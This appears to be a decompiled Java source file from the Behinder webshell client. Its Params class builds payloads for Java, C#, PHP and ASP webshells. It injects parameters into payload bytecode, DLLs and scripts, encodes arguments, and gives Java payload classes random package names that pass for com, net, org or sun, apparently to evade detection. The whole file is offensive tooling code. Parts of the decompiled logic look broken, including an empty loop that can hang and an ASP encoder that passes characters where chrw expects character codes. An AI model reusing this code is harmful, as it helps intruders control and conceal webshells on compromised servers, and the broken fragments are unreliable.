package net.rebeyond.behinder.core;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import net.rebeyond.behinder.utils.ReplacingInputStream;
import net.rebeyond.behinder.utils.Utils;
import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.FieldVisitor;

public class Params {
   public static byte[] getParamedClass(String clsName, final Map params) throws Exception {
      String clsPath = String.format("net/rebeyond/behinder/payload/java/%s.class", clsName);
      ClassReader classReader = new ClassReader(String.format("net.rebeyond.behinder.payload.java.%s", clsName));
      ClassWriter cw = new ClassWriter(1);
      classReader.accept(new ClassAdapter(cw) {
         public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
            if (params.containsKey(filedName)) {
               String paramValue = (String)params.get(filedName);
               return super.visitField(arg0, filedName, arg2, arg3, paramValue);
            } else {
               return super.visitField(arg0, filedName, arg2, arg3, arg4);
            }
         }
      }, 0);
      byte[] result = cw.toByteArray();
      String oldClassName = String.format("net/rebeyond/behinder/payload/java/%s", clsName);
      if (!clsName.equals("LoadNativeLibrary")) {
         String newClassName = getRandomClassName(oldClassName);
         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(oldClassName.length() + 2), 76}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(newClassName.length() + 2), 76}, newClassName.getBytes()));
         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)oldClassName.length()}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)newClassName.length()}, newClassName.getBytes()));
      }

      result[7] = 50;
      return result;
   }

   private static String getRandomClassName(String sourceName) {
      String[] domainAs = new String[]{"com", "net", "org", "sun"};
      String domainB = Utils.getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
      String domainC = Utils.getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
      String domainD = Utils.getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
      String className = Utils.getRandomAlpha((new Random()).nextInt(7) + 4);
      className = className.substring(0, 1).toUpperCase() + className.substring(1).toLowerCase();
      int domainAIndex = (new Random()).nextInt(4);
      String domainA = domainAs[domainAIndex];
      int randomSegments = (new Random()).nextInt(3) + 3;
      String randomName;
      switch(randomSegments) {
      case 3:
         randomName = domainA + "/" + domainB + "/" + className;
         break;
      case 4:
         randomName = domainA + "/" + domainB + "/" + domainC + "/" + className;
         break;
      case 5:
         randomName = domainA + "/" + domainB + "/" + domainC + "/" + domainD + "/" + className;
         break;
      default:
         randomName = domainA + "/" + domainB + "/" + domainC + "/" + domainD + "/" + className;
      }

      while(randomName.length() > sourceName.length()) {
      }

      return randomName;
   }

   public static byte[] getParamedClassForPlugin(String payloadPath, final Map params) throws Exception {
      ClassReader classReader = new ClassReader(Utils.getFileData(payloadPath));
      ClassWriter cw = new ClassWriter(1);
      classReader.accept(new ClassAdapter(cw) {
         public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
            if (params.containsKey(filedName)) {
               String paramValue = (String)params.get(filedName);
               return super.visitField(arg0, filedName, arg2, arg3, paramValue);
            } else {
               return super.visitField(arg0, filedName, arg2, arg3, arg4);
            }
         }
      }, 0);
      byte[] result = cw.toByteArray();
      return result;
   }

   public static byte[] getParamedAssembly(String clsName, Map params) throws Exception {
      String basePath = "net/rebeyond/behinder/payload/csharp/";
      String payloadPath = basePath + clsName + ".dll";
      byte[] result = Utils.getResourceData(payloadPath);
      if (params.keySet().size() == 0) {
         return result;
      } else {
         String paramsStr = "";

         String paramName;
         String paramValue;
         for(Iterator var6 = params.keySet().iterator(); var6.hasNext(); paramsStr = paramsStr + paramName + ":" + paramValue + ",") {
            paramName = (String)var6.next();
            paramValue = Base64.encode(((String)params.get(paramName)).toString().getBytes("UTF-8"));
         }

         paramsStr = paramsStr.substring(0, paramsStr.length() - 1);
         String token = "~~~~~~" + paramsStr;
         return Utils.mergeBytes(result, token.getBytes());
      }
   }

   public static byte[] getParamedAssemblyClassic(String clsName, Map params) throws Exception {
      String basePath = "net/rebeyond/behinder/payload/csharp/";
      String payloadPath = basePath + clsName + ".dll";
      ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      Iterator var6 = params.keySet().iterator();

      while(var6.hasNext()) {
         String paraName = (String)var6.next();
         String paraValue = (String)params.get(paraName);
         StringBuilder searchStr = new StringBuilder();

         while(searchStr.length() < paraValue.length()) {
            searchStr.append(paraName);
         }

         byte[] search = Utils.ascii2unicode("~" + searchStr.substring(0, paraValue.length()), 0);
         byte[] replacement = Utils.ascii2unicode(paraValue, 1);
         ReplacingInputStream ris = new ReplacingInputStream(bis, search, replacement);

         int b;
         while(-1 != (b = ris.read())) {
            bos.write(b);
         }

         ris.close();
      }

      return bos.toByteArray();
   }

   public static byte[] getParamedPhp(String clsName, Map params) throws Exception {
      String basePath = "net/rebeyond/behinder/payload/php/";
      String payloadPath = basePath + clsName + ".php";
      StringBuilder code = new StringBuilder();
      ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
      ByteArrayOutputStream bos = new ByteArrayOutputStream();

      int b;
      while(-1 != (b = bis.read())) {
         bos.write(b);
      }

      bis.close();
      code.append(bos.toString());
      String paraList = "";
      Iterator var9 = getPhpParams(code.toString()).iterator();

      while(var9.hasNext()) {
         String paraName = (String)var9.next();
         if (params.keySet().contains(paraName)) {
            String paraValue = (String)params.get(paraName);
            paraValue = java.util.Base64.getEncoder().encodeToString(paraValue.getBytes());
            code.append(String.format("$%s=\"%s\";$%s=base64_decode($%s);", paraName, paraValue, paraName, paraName));
            paraList = paraList + ",$" + paraName;
         } else {
            code.append(String.format("$%s=\"%s\";", paraName, ""));
            paraList = paraList + ",$" + paraName;
         }
      }

      paraList = paraList.replaceFirst(",", "");
      code.append("\r\nmain(" + paraList + ");");
      return code.toString().getBytes();
   }

   public static List getPhpParams(String phpPayload) {
      List paramList = new ArrayList();
      Pattern mainPattern = Pattern.compile("main\\s*\\([^\\)]*\\)");
      Matcher mainMatch = mainPattern.matcher(phpPayload);
      if (mainMatch.find()) {
         String mainStr = mainMatch.group(0);
         Pattern paramPattern = Pattern.compile("\\$([a-zA-Z]*)");
         Matcher paramMatch = paramPattern.matcher(mainStr);

         while(paramMatch.find()) {
            paramList.add(paramMatch.group(1));
         }
      }

      return paramList;
   }

   public static byte[] getParamedAsp(String clsName, Map params) throws Exception {
      String basePath = "net/rebeyond/behinder/payload/asp/";
      String payloadPath = basePath + clsName + ".asp";
      StringBuilder code = new StringBuilder();
      ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
      ByteArrayOutputStream bos = new ByteArrayOutputStream();

      int b;
      while(-1 != (b = bis.read())) {
         bos.write(b);
      }

      bis.close();
      code.append(bos.toString());
      String paraList = "";
      if (params.size() > 0) {
         paraList = paraList + "Array(";

         String paraValueEncoded;
         for(Iterator var9 = params.keySet().iterator(); var9.hasNext(); paraList = paraList + "," + paraValueEncoded) {
            String paraName = (String)var9.next();
            String paraValue = (String)params.get(paraName);
            paraValueEncoded = "";

            for(int i = 0; i < paraValue.length(); ++i) {
               paraValueEncoded = paraValueEncoded + "&chrw(" + paraValue.charAt(i) + ")";
            }

            paraValueEncoded = paraValueEncoded.replaceFirst("&", "");
         }

         paraList = paraList + ")";
      }

      paraList = paraList.replaceFirst(",", "");
      code.append("\r\nmain " + paraList + "");
      return code.toString().getBytes();
   }

   public static class t extends ClassLoader {
      public Class get(byte[] b) {
         return super.defineClass(b, 0, b.length);
      }
   }
}
